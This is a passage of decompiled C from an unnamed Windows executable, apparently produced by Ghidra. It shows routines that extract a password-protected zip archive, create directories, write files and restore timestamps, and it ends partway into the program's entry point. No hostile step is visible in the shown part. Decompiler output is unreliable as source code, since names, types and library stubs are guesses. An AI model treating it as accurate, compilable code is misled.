    *param_4 = local_10;
    *piVar3 = *piVar3 + local_10;
  }
  else {
    iVar5 = -1;
  }
  return iVar5;
}



undefined4 FUN_0040671d(void **param_1,byte *param_2)

{
  void **ppvVar1;
  undefined uVar2;
  int iVar3;
  void **_Memory;
  void *pvVar4;
  undefined4 uVar5;
  int local_10;
  void *local_c;
  void *local_8;
  
  ppvVar1 = param_1;
  if ((param_1 == (void **)0x0) || (param_1[6] == (void *)0x0)) {
    uVar5 = 0xffffff9a;
  }
  else {
    if (param_1[0x1f] != (void *)0x0) {
      FUN_00406a97(param_1);
    }
    iVar3 = FUN_0040657a(param_1,&local_10,&local_8,&local_c);
    if (iVar3 == 0) {
      _Memory = (void **)malloc(0x84);
      if (_Memory != (void **)0x0) {
        pvVar4 = malloc(0x4000);
        *_Memory = pvVar4;
        _Memory[0x11] = local_8;
        _Memory[0x12] = local_c;
        _Memory[0x13] = (void *)0x0;
        if (pvVar4 != (void *)0x0) {
          _Memory[0x10] = (void *)0x0;
          pvVar4 = param_1[0xd];
          _Memory[0x15] = param_1[0xf];
          _Memory[0x14] = (void *)0x0;
          _Memory[0x19] = param_1[0xd];
          _Memory[0x18] = *param_1;
          _Memory[0x1a] = param_1[3];
          _Memory[6] = (void *)0x0;
          if (pvVar4 != (void *)0x0) {
            _Memory[9] = (void *)0x0;
            _Memory[10] = (void *)0x0;
            _Memory[0xb] = (void *)0x0;
            iVar3 = FUN_00405777(_Memory + 1);
            if (iVar3 == 0) {
              _Memory[0x10] = (void *)0x1;
            }
          }
          _Memory[0x16] = param_1[0x10];
          _Memory[0x17] = param_1[0x11];
          *(byte *)(_Memory + 0x1b) = *(byte *)(param_1 + 0xc) & 1;
          if (((uint)param_1[0xc] >> 3 & 1) == 0) {
            uVar2 = (undefined)((uint)param_1[0xf] >> 0x18);
          }
          else {
            uVar2 = (undefined)((uint)param_1[0xe] >> 8);
          }
          *(undefined *)(_Memory + 0x20) = uVar2;
          _Memory[0x1d] = (void *)0x23456789;
          _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
          _Memory[0x1c] = (void *)0x12345678;
          _Memory[0x1e] = (void *)0x34567890;
          param_1 = (void **)param_2;
          if (param_2 != (byte *)0x0) {
            do {
              if (*(byte *)param_1 == 0) break;
              FUN_00405535(_Memory + 0x1c,(uint)param_1 & 0xffffff00 | (uint)*(byte *)param_1);
              param_1 = (void **)((int)param_1 + 1);
            } while (param_1 != (void **)0x0);
          }
          pvVar4 = ppvVar1[0x1e];
          _Memory[2] = (void *)0x0;
          _Memory[0xf] = (void *)((int)pvVar4 + local_10 + 0x1e);
          ppvVar1[0x1f] = _Memory;
          return 0;
        }
        free(_Memory);
      }
      uVar5 = 0xffffff98;
    }
    else {
      uVar5 = 0xffffff99;
    }
  }
  return uVar5;
}



int FUN_00406880(uint param_1,int param_2,uint param_3,undefined *param_4)

{
  int *piVar1;
  char cVar2;
  int *piVar3;
  undefined uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  int local_c;
  int local_8;
  
  local_c = 0;
  local_8 = 0;
  if (param_4 != (undefined *)0x0) {
    *param_4 = 0;
  }
  if ((param_1 == 0) || (piVar3 = *(int **)(param_1 + 0x7c), piVar3 == (int *)0x0)) {
    local_8 = -0x66;
  }
  else if (*piVar3 == 0) {
    local_8 = -100;
  }
  else if (param_3 == 0) {
LAB_00406a75:
    local_8 = 0;
  }
  else {
    piVar3[5] = param_3;
    piVar3[4] = param_2;
    if ((uint)piVar3[0x17] < param_3) {
      piVar3[5] = piVar3[0x17];
    }
    if (piVar3[5] != 0) {
      do {
        if ((piVar3[2] == 0) && (uVar7 = piVar3[0x16], uVar7 != 0)) {
          uVar6 = 0x4000;
          if ((uVar7 < 0x4000) && (uVar6 = uVar7, uVar7 == 0)) {
            if (param_4 != (undefined *)0x0) {
              *param_4 = 1;
            }
            goto LAB_00406a75;
          }
          iVar5 = FUN_00405d0e(piVar3[0x18],piVar3[0x1a] + piVar3[0xf],0);
          if ((iVar5 != 0) || (iVar5 = FUN_00405d8a(*piVar3,uVar6,1,piVar3[0x18]), iVar5 != 1)) {
            return -1;
          }
          piVar3[0xf] = piVar3[0xf] + uVar6;
          piVar3[0x16] = piVar3[0x16] - uVar6;
          iVar5 = *piVar3;
          piVar3[1] = iVar5;
          piVar3[2] = uVar6;
          if ((*(char *)(piVar3 + 0x1b) != '\0') && (param_1 = 0, uVar6 != 0)) {
            do {
              uVar4 = FUN_004055a3(piVar3 + 0x1c,
                                   param_1 & 0xffffff00 | (uint)*(byte *)(param_1 + iVar5));
              uVar7 = param_1 + 1;
              *(undefined *)(param_1 + iVar5) = uVar4;
              param_1 = uVar7;
            } while (uVar7 < uVar6);
          }
        }
        uVar7 = piVar3[2];
        uVar6 = piVar3[0x1f];
        if (uVar7 < (uint)piVar3[0x1f]) {
          uVar6 = uVar7;
        }
        if (uVar6 != 0) {
          cVar2 = *(char *)(piVar3[1] + -1 + uVar6);
          piVar1 = piVar3 + 0x1f;
          *piVar1 = *piVar1 - uVar6;
          piVar3[2] = uVar7 - uVar6;
          piVar3[1] = piVar3[1] + uVar6;
          if ((*piVar1 == 0) && (cVar2 != *(char *)(piVar3 + 0x20))) {
            return -0x6a;
          }
        }
        if (piVar3[0x19] == 0) {
          uVar7 = piVar3[2];
          if ((uint)piVar3[5] < (uint)piVar3[2]) {
            uVar7 = piVar3[5];
          }
          uVar6 = 0;
          if (uVar7 != 0) {
            do {
              *(undefined *)(piVar3[4] + uVar6) = *(undefined *)(piVar3[1] + uVar6);
              uVar6 = uVar6 + 1;
            } while (uVar6 < uVar7);
          }
          iVar5 = FUN_0040541f(piVar3[0x14],piVar3[4],uVar7);
          piVar3[0x17] = piVar3[0x17] - uVar7;
          piVar3[2] = piVar3[2] - uVar7;
          piVar3[5] = piVar3[5] - uVar7;
          piVar3[4] = piVar3[4] + uVar7;
          piVar3[1] = piVar3[1] + uVar7;
          piVar3[6] = piVar3[6] + uVar7;
          local_8 = local_8 + uVar7;
          piVar3[0x14] = iVar5;
          if ((piVar3[0x17] == 0) && (param_4 != (undefined *)0x0)) {
            *param_4 = 1;
          }
        }
        else {
          iVar5 = piVar3[4];
          iVar8 = piVar3[6];
          local_c = FUN_0040583c(piVar3 + 1,2);
          iVar8 = piVar3[6] - iVar8;
          iVar5 = FUN_0040541f(piVar3[0x14],iVar5,iVar8);
          piVar3[0x17] = piVar3[0x17] - iVar8;
          local_8 = local_8 + iVar8;
          piVar3[0x14] = iVar5;
          if ((local_c == 1) || (piVar3[0x17] == 0)) {
            if (param_4 == (undefined *)0x0) {
              return local_8;
            }
            *param_4 = 1;
            return local_8;
          }
          if (local_c != 0) {
            return local_c;
          }
        }
      } while (piVar3[5] != 0);
      if (local_c != 0) {
        return local_c;
      }
    }
  }
  return local_8;
}



undefined4 FUN_00406a97(int param_1)

{
  void **_Memory;
  undefined4 local_4;
  
  local_4 = 0;
  if ((param_1 == 0) || (_Memory = *(void ***)(param_1 + 0x7c), _Memory == (void **)0x0)) {
    local_4 = 0xffffff9a;
  }
  else {
    if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
      local_4 = 0xffffff97;
    }
    if (*_Memory != (void *)0x0) {
      free(*_Memory);
      *_Memory = (void *)0x0;
    }
    *_Memory = (void *)0x0;
    if (_Memory[0x10] != (void *)0x0) {
      FUN_00405739(_Memory + 1);
    }
    _Memory[0x10] = (void *)0x0;
    free(_Memory);
    *(undefined4 *)(param_1 + 0x7c) = 0;
  }
  return local_4;
}



void FUN_00406b02(uint param_1)

{
  __allmul(param_1 + 0xb6109100,((int)param_1 >> 0x1f) + 2 + (uint)(0x49ef6eff < param_1),10000000,0
          );
  return;
}



_FILETIME FUN_00406b23(uint param_1,uint param_2)

{
  SYSTEMTIME local_1c;
  _FILETIME local_c;
  
  local_1c.wMilliseconds = 0;
  local_1c.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_1c.wDay = (ushort)param_1 & 0x1f;
  local_1c.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_1c.wHour = (ushort)param_2 >> 0xb;
  local_1c.wSecond = (WORD)((param_2 & 0x1f) << 1);
  local_1c.wMinute = (ushort)(param_2 >> 5) & 0x3f;
  SystemTimeToFileTime(&local_1c,&local_c);
  return local_c;
}



int * __thiscall FUN_00406b8e(int *param_1_00,HANDLE param_1,undefined4 param_2,int param_3)

{
  int *lpBuffer;
  char cVar1;
  size_t sVar2;
  DWORD DVar3;
  int iVar4;
  int *local_8;
  
  if ((*param_1_00 == 0) && (param_1_00[1] == -1)) {
    lpBuffer = param_1_00 + 0x50;
    local_8 = param_1_00;
    GetCurrentDirectoryA(0x104,(LPSTR)lpBuffer);
    sVar2 = strlen((char *)lpBuffer);
    cVar1 = *(char *)(sVar2 + 0x13f + (int)param_1_00);
    if ((cVar1 != '\\') && (cVar1 != '/')) {
      strcat((char *)lpBuffer,&DAT_0040f818);
    }
    if ((param_3 == 1) && (DVar3 = SetFilePointer(param_1,0,(PLONG)0x0,1), DVar3 == 0xffffffff)) {
      local_8 = (int *)0x2000000;
    }
    else {
      iVar4 = FUN_00405bae(param_1,param_2,param_3,&local_8);
      if (iVar4 != 0) {
        iVar4 = FUN_00405fe2(iVar4);
        *param_1_00 = iVar4;
        local_8 = (int *)((-(uint)(iVar4 != 0) & 0xfffffe00) + 0x200);
      }
    }
  }
  else {
    local_8 = (int *)0x1000000;
  }
  return local_8;
}



undefined4 __thiscall FUN_00406c40(int *param_1_00,int param_1,undefined4 *param_2)

{
  undefined *puVar1;
  uchar uVar2;
  int *piVar3;
  void *pvVar4;
  byte bVar5;
  int iVar6;
  uint uVar7;
  uchar *puVar8;
  int iVar9;
  byte bVar10;
  byte bVar11;
  uchar *_Str;
  undefined8 uVar12;
  uchar local_284 [260];
  char local_180 [260];
  uint local_7c [4];
  uint local_6c;
  undefined4 local_64;
  undefined4 local_60;
  uint local_48;
  undefined local_2c [4];
  FILETIME local_28;
  _FILETIME local_20;
  int *local_18;
  undefined4 local_14;
  uint local_10;
  void *local_c;
  byte local_5;
  
  if ((param_1 < -1) || (*(int *)(*param_1_00 + 4) <= param_1)) {
    return 0x10000;
  }
  local_18 = param_1_00;
  if (param_1_00[1] != -1) {
    FUN_00406a97(*param_1_00);
  }
  param_1_00[1] = -1;
  if (param_1 == param_1_00[0x4d]) {
    if (param_1 != -1) {
      memcpy(param_2,param_1_00 + 2,300);
      return 0;
    }
  }
  else if (param_1 != -1) {
    if (param_1 < *(int *)(*param_1_00 + 0x10)) {
      FUN_004064e2(*param_1_00);
    }
    while (*(int *)(*param_1_00 + 0x10) < param_1) {
      FUN_00406520(*param_1_00);
    }
    FUN_004064bb(*param_1_00,local_7c,local_180,0x104,0,0,0,0);
    iVar6 = FUN_0040657a(*param_1_00,local_2c,&local_14,&local_10);
    if (iVar6 != 0) {
      return 0x700;
    }
    iVar6 = FUN_00405d0e(*(undefined4 *)*param_1_00,local_14,0);
    if (iVar6 == 0) {
      local_c = operator_new(local_10);
      uVar7 = FUN_00405d8a(local_c,1,local_10,*(undefined4 *)*param_1_00);
      if (uVar7 == local_10) {
        *param_2 = *(undefined4 *)(*param_1_00 + 0x10);
        strcpy((char *)local_284,local_180);
        _Str = local_284;
        while( true ) {
          while( true ) {
            for (; (uVar2 = *_Str, uVar2 != '\0' && (_Str[1] == ':')); _Str = _Str + 2) {
            }
            if ((uVar2 != '\\') && (uVar2 != '/')) break;
            _Str = _Str + 1;
          }
          puVar8 = _mbsstr(_Str,&DAT_0040f838);
          if ((puVar8 == (uchar *)0x0) &&
             (((puVar8 = _mbsstr(_Str,&DAT_0040f830), puVar8 == (uchar *)0x0 &&
               (puVar8 = _mbsstr(_Str,&DAT_0040f828), puVar8 == (uchar *)0x0)) &&
              (puVar8 = _mbsstr(_Str,&DAT_0040f820), puVar8 == (uchar *)0x0)))) break;
          _Str = puVar8 + 4;
        }
        strcpy((char *)(param_2 + 1),(char *)_Str);
        param_2._3_1_ = 0;
        local_5 = 0;
        bVar10 = ~(byte)(local_48 >> 0x17);
        bVar5 = (byte)(local_48 >> 0x1e);
        local_7c[0] = local_7c[0] >> 8;
        bVar11 = 1;
        if ((((local_7c[0] == 0) || (local_7c[0] == 7)) || (local_7c[0] == 0xb)) ||
           (local_7c[0] == 0xe)) {
          bVar10 = (byte)local_48;
          param_2._3_1_ = (byte)(local_48 >> 1) & 1;
          local_5 = (byte)(local_48 >> 2) & 1;
          bVar5 = (byte)(local_48 >> 4);
          bVar11 = (byte)(local_48 >> 5) & 1;
        }
        iVar6 = 0;
        param_2[0x42] = 0;
        if ((bVar5 & 1) != 0) {
          param_2[0x42] = 0x10;
        }
        if (bVar11 != 0) {
          param_2[0x42] = param_2[0x42] | 0x20;
        }
        if (param_2._3_1_ != 0) {
          param_2[0x42] = param_2[0x42] | 2;
        }
        if ((bVar10 & 1) != 0) {
          param_2[0x42] = param_2[0x42] | 1;
        }
        if (local_5 != 0) {
          param_2[0x42] = param_2[0x42] | 4;
        }
        param_2[0x49] = local_64;
        param_2[0x4a] = local_60;
        local_28 = FUN_00406b23(local_6c >> 0x10,local_6c);
        LocalFileTimeToFileTime(&local_28,&local_20);
        pvVar4 = local_c;
        param_2[0x43] = local_20.dwLowDateTime;
        param_2[0x45] = local_20.dwLowDateTime;
        param_2[0x47] = local_20.dwLowDateTime;
        param_2[0x44] = local_20.dwHighDateTime;
        param_2[0x46] = local_20.dwHighDateTime;
        param_2[0x48] = local_20.dwHighDateTime;
        if (4 < local_10) {
          do {
            local_c = (void *)((uint)local_c & 0xff000000 |
                              (uint)CONCAT11(*(undefined *)((int)pvVar4 + iVar6 + 1),
                                             *(undefined *)(iVar6 + (int)pvVar4)));
            bVar10 = *(byte *)((int)pvVar4 + iVar6 + 2);
            iVar9 = strcmp((char *)&local_c,&DAT_0040f81c);
            if (iVar9 == 0) {
              bVar10 = *(byte *)(iVar6 + 4 + (int)pvVar4);
              local_5 = bVar10 >> 2 & 1;
              iVar9 = iVar6 + 5;
              if ((bVar10 & 1) != 0) {
                puVar1 = (undefined *)(iVar9 + (int)pvVar4);
                iVar9 = iVar6 + 9;
                uVar12 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                        *(undefined *)(iVar6 + 6 + (int)pvVar4)),
                                               *puVar1));
                param_2[0x47] = (int)uVar12;
                param_2[0x48] = (int)((ulonglong)uVar12 >> 0x20);
              }
              if ((bVar10 >> 1 & 1) != 0) {
                iVar6 = iVar9 + 1;
                puVar1 = (undefined *)(iVar9 + (int)pvVar4);
                iVar9 = iVar9 + 4;
                uVar12 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)(puVar1 + 2),
                                                        *(undefined *)(iVar6 + (int)pvVar4)),*puVar1
                                              ));
                param_2[0x43] = (int)uVar12;
                param_2[0x44] = (int)((ulonglong)uVar12 >> 0x20);
              }
              if (local_5 != 0) {
                uVar12 = FUN_00406b02(CONCAT31(CONCAT21(*(undefined2 *)
                                                         ((undefined *)(iVar9 + (int)pvVar4) + 2),
                                                        *(undefined *)(iVar9 + 1 + (int)pvVar4)),
                                               *(undefined *)(iVar9 + (int)pvVar4)));
                param_2[0x45] = (int)uVar12;
                param_2[0x46] = (int)((ulonglong)uVar12 >> 0x20);
              }
              break;
            }
            iVar6 = iVar6 + 4 + (uint)bVar10;
          } while (iVar6 + 4U < local_10);
        }
        if (pvVar4 != (void *)0x0) {
          operator_delete(pvVar4);
        }
        piVar3 = local_18;
        memcpy(local_18 + 2,param_2,300);
        piVar3[0x4d] = param_1;
        return 0;
      }
      operator_delete(local_c);
    }
    return 0x800;
  }
  *param_2 = *(undefined4 *)(*param_1_00 + 4);
  *(undefined *)(param_2 + 1) = 0;
  param_2[0x42] = 0;
  param_2[0x43] = 0;
  param_2[0x44] = 0;
  param_2[0x45] = 0;
  param_2[0x46] = 0;
  param_2[0x47] = 0;
  param_2[0x48] = 0;
  param_2[0x49] = 0;
  param_2[0x4a] = 0;
  return 0;
}



void FUN_00407070(LPCSTR param_1,char *param_2)

{
  char cVar1;
  DWORD DVar2;
  char *pcVar3;
  char *pcVar4;
  undefined local_20c [260];
  char local_108 [260];
  
  if ((param_1 != (LPCSTR)0x0) && (DVar2 = GetFileAttributesA(param_1), DVar2 == 0xffffffff)) {
    CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  }
  cVar1 = *param_2;
  pcVar3 = param_2;
  pcVar4 = param_2;
  if (cVar1 != '\0') {
    do {
      if ((cVar1 == '/') || (cVar1 == '\\')) {
        pcVar4 = pcVar3;
      }
      cVar1 = pcVar3[1];
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    if (pcVar4 != param_2) {
      memcpy(local_20c,param_2,(int)pcVar4 - (int)param_2);
      local_20c[(int)pcVar4 - (int)param_2] = 0;
      FUN_00407070(param_1,local_20c);
    }
    local_108[0] = '\0';
    if (param_1 != (LPCSTR)0x0) {
      strcpy(local_108,param_1);
    }
    strcat(local_108,param_2);
    DVar2 = GetFileAttributesA(local_108);
    if (DVar2 == 0xffffffff) {
      CreateDirectoryA(local_108,(LPSECURITY_ATTRIBUTES)0x0);
    }
  }
  return;
}



int __thiscall FUN_00407136(int *param_1_00,char *param_1,char *param_2,int param_3,int param_4)

{
  char *pcVar1;
  int iVar2;
  int iVar3;
  char cVar4;
  int iVar5;
  char *pcVar6;
  void *pvVar7;
  DWORD nNumberOfBytesToWrite;
  BOOL BVar8;
  char *pcVar9;
  char *pcVar10;
  CHAR local_33c [260];
  undefined local_238 [264];
  uint local_130;
  FILETIME local_12c;
  FILETIME local_124;
  FILETIME local_11c [2];
  char local_10c [260];
  DWORD local_8;
  
  iVar2 = param_4;
  iVar5 = (int)param_1;
  if (param_4 == 3) {
    if (param_1 != (char *)param_1_00[1]) {
      if (param_1_00[1] != -1) {
        FUN_00406a97(*param_1_00);
      }
      iVar2 = *param_1_00;
      param_1_00[1] = -1;
      if (*(int *)(iVar2 + 4) <= iVar5) {
        return 0x10000;
      }
      if (iVar5 < *(int *)(iVar2 + 0x10)) {
        FUN_004064e2(iVar2);
      }
      while (*(int *)(*param_1_00 + 0x10) < iVar5) {
        FUN_00406520(*param_1_00);
      }
      FUN_0040671d(*param_1_00,param_1_00[0x4e]);
      param_1_00[1] = iVar5;
    }
    iVar5 = FUN_00406880(*param_1_00,param_2,param_3,(int)&param_1 + 3);
    if (iVar5 < 1) {
      FUN_00406a97(*param_1_00);
      param_1_00[1] = -1;
    }
    if (param_1._3_1_ != '\0') {
      return 0;
    }
    if (iVar5 < 1) {
      return ((iVar5 != -0x6a) - 1 & 0xfb001000) + 0x5000000;
    }
    return 0x600;
  }
  if ((param_4 != 2) && (param_4 != 1)) {
    return 0x10000;
  }
  if (param_1_00[1] != -1) {
    FUN_00406a97(*param_1_00);
  }
  iVar3 = (int)param_1;
  iVar5 = *param_1_00;
  param_1_00[1] = -1;
  if (*(int *)(iVar5 + 4) <= (int)param_1) {
    return 0x10000;
  }
  if ((int)param_1 < *(int *)(iVar5 + 0x10)) {
    FUN_004064e2(iVar5);
  }
  while (*(int *)(*param_1_00 + 0x10) < iVar3) {
    FUN_00406520(*param_1_00);
  }
  FUN_00406c40(iVar3,local_238);
  pcVar6 = param_2;
  if ((local_130 & 0x10) != 0) {
    if (iVar2 == 1) {
      return 0;
    }
    cVar4 = *param_2;
    if (((cVar4 == '/') || (cVar4 == '\\')) || ((cVar4 != '\0' && (param_2[1] == ':')))) {
      param_1_00 = (int *)0x0;
    }
    else {
      param_1_00 = param_1_00 + 0x50;
    }
    FUN_00407070(param_1_00,param_2);
    return 0;
  }
  if (iVar2 == 1) goto LAB_00407331;
  cVar4 = *param_2;
  pcVar9 = param_2;
  pcVar10 = param_2;
  while (cVar4 != '\0') {
    if ((cVar4 == '/') || (cVar4 == '\\')) {
      pcVar10 = pcVar9 + 1;
    }
    pcVar1 = pcVar9 + 1;
    pcVar9 = pcVar9 + 1;
    cVar4 = *pcVar1;
  }
  strcpy(local_10c,param_2);
  if (pcVar10 == pcVar6) {
    local_10c[0] = '\0';
LAB_004072e1:
    wsprintfA(local_33c,s__s_s_s_0040f848,param_1_00 + 0x50,local_10c,pcVar10);
    FUN_00407070(param_1_00 + 0x50,local_10c);
  }
  else {
    pcVar10[(int)(local_10c + -(int)pcVar6)] = '\0';
    if (((local_10c[0] != '/') && (local_10c[0] != '\\')) &&
       ((local_10c[0] == '\0' || (local_10c[1] != ':')))) goto LAB_004072e1;
    wsprintfA(local_33c,&DAT_0040f840,local_10c,pcVar10);
    FUN_00407070(0,local_10c);
  }
  pcVar6 = (char *)CreateFileA(local_33c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_130,
                               (HANDLE)0x0);
LAB_00407331:
  if (pcVar6 == (char *)0xffffffff) {
    return 0x200;
  }
  param_1 = pcVar6;
  FUN_0040671d(*param_1_00,param_1_00[0x4e]);
  if (param_1_00[0x4f] == 0) {
    pvVar7 = operator_new(0x4000);
    param_1_00[0x4f] = (int)pvVar7;
  }
  param_3 = 0;
  do {
    nNumberOfBytesToWrite = FUN_00406880(*param_1_00,param_1_00[0x4f],0x4000,(int)&param_2 + 3);
    if (nNumberOfBytesToWrite == 0xffffff96) {
      param_3 = 0x1000;
      goto LAB_0040745a;
    }
    if ((int)nNumberOfBytesToWrite < 0) break;
    if ((0 < (int)nNumberOfBytesToWrite) &&
       (BVar8 = WriteFile(param_1,(LPCVOID)param_1_00[0x4f],nNumberOfBytesToWrite,&local_8,
                          (LPOVERLAPPED)0x0), BVar8 == 0)) {
      param_3 = 0x400;
      goto LAB_0040745a;
    }
    if (param_2._3_1_ != '\0') {
      SetFileTime(param_1,&local_124,&local_12c,local_11c);
      goto LAB_0040745a;
    }
  } while (nNumberOfBytesToWrite != 0);
  param_3 = 0x5000000;
LAB_0040745a:
  if (param_4 != 1) {
    CloseHandle(param_1);
  }
  FUN_00406a97(*param_1_00);
  return param_3;
}



undefined4 __fastcall FUN_0040747b(int *param_1)

{
  if (param_1[1] != -1) {
    FUN_00406a97(*param_1);
  }
  param_1[1] = -1;
  if (*param_1 != 0) {
    FUN_00406162(*param_1);
  }
  *param_1 = 0;
  return 0;
}



undefined4 * FUN_004074a4(void)

{
  void *pvVar1;
  undefined4 *puVar2;
  int unaff_EBP;
  undefined4 *in_FS_OFFSET;
  
  FUN_004076c8();
  pvVar1 = operator_new(0x244);
  *(void **)(unaff_EBP + -0x10) = pvVar1;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (pvVar1 == (void *)0x0) {
    pvVar1 = (void *)0x0;
  }
  else {
    pvVar1 = (void *)FUN_00407527(*(undefined4 *)(unaff_EBP + 0x14));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  DAT_0040f938 = FUN_00406b8e(*(undefined4 *)(unaff_EBP + 8),*(undefined4 *)(unaff_EBP + 0xc),
                              *(undefined4 *)(unaff_EBP + 0x10));
  if (DAT_0040f938 == 0) {
    puVar2 = (undefined4 *)operator_new(8);
    *puVar2 = 1;
    puVar2[1] = pvVar1;
  }
  else {
    if (pvVar1 != (void *)0x0) {
      FUN_00407572();
      operator_delete(pvVar1);
    }
    puVar2 = (undefined4 *)0x0;
  }
  *in_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return puVar2;
}



undefined4 * __thiscall FUN_00407527(undefined4 *param_1_00,char *param_1)

{
  size_t sVar1;
  char *_Dest;
  
  param_1_00[1] = 0xffffffff;
  param_1_00[0x4d] = 0xffffffff;
  *param_1_00 = 0;
  param_1_00[0x4e] = 0;
  param_1_00[0x4f] = 0;
  if (param_1 != (char *)0x0) {
    sVar1 = strlen(param_1);
    _Dest = (char *)operator_new(sVar1 + 1);
    param_1_00[0x4e] = _Dest;
    strcpy(_Dest,param_1);
  }
  return param_1_00;
}



void __fastcall FUN_00407572(int param_1)

{
  if (*(void **)(param_1 + 0x138) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x138));
  }
  *(undefined4 *)(param_1 + 0x138) = 0;
  if (*(void **)(param_1 + 0x13c) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x13c));
  }
  *(undefined4 *)(param_1 + 0x13c) = 0;
  return;
}



void FUN_004075ad(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_004074a4(param_1,param_2,3,param_3);
  return;
}



void FUN_004075c4(int *param_1,undefined4 param_2,undefined4 *param_3)

{
  *param_3 = 0;
  *(undefined *)(param_3 + 1) = 0;
  param_3[0x4a] = 0;
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0040f938 = FUN_00406c40(param_2,param_3);
  }
  else {
    DAT_0040f938 = 0x80000;
  }
  return;
}



void FUN_00407603(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0040f938 = FUN_00407136(param_2,param_3,param_4,param_5);
  }
  else {
    DAT_0040f938 = 0x80000;
  }
  return;
}



void FUN_0040763d(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00407603(param_1,param_2,param_3,0,2);
  return;
}



undefined4 FUN_00407656(int *param_1)

{
  void *pvVar1;
  
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else {
    if (*param_1 == 1) {
      pvVar1 = (void *)param_1[1];
      DAT_0040f938 = FUN_0040747b();
      if (pvVar1 != (void *)0x0) {
        FUN_00407572();
        operator_delete(pvVar1);
      }
      operator_delete(param_1);
      return DAT_0040f938;
    }
    DAT_0040f938 = 0x80000;
  }
  return DAT_0040f938;
}



// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076a8. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcpy();
  return pcVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ae. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memset();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076b4. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen();
  return sVar1;
}



void FUN_004076c8(void)

{
  undefined4 in_FS_OFFSET;
  undefined auStack12 [12];
  
  *(undefined **)in_FS_OFFSET = auStack12;
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004076e8. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ee. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = memcmp();
  return iVar1;
}



void _local_unwind2(void)

{
                    // WARNING: Could not recover jumptable at 0x004076fa. Too many branches
                    // WARNING: Treating indirect jump as call
  _local_unwind2();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407700. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)operator_new();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407706. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memcpy();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __cdecl strcmp(char *_Str1,char *_Str2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407740. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x0040776e. Too many branches
                    // WARNING: Treating indirect jump as call
  _CxxThrowException();
  return;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio

ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return (ulonglong)param_1 * (ulonglong)param_3 & 0xffffffff |
         (ulonglong)
         ((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
         param_2 * param_3 + param_1 * param_4) << 0x20;
}



// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strcat(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004077b4. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcat();
  return pcVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void)

{
  undefined4 *puVar1;
  uint uVar2;
  HMODULE pHVar3;
  byte *pbVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar5;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  undefined4 uStack20;
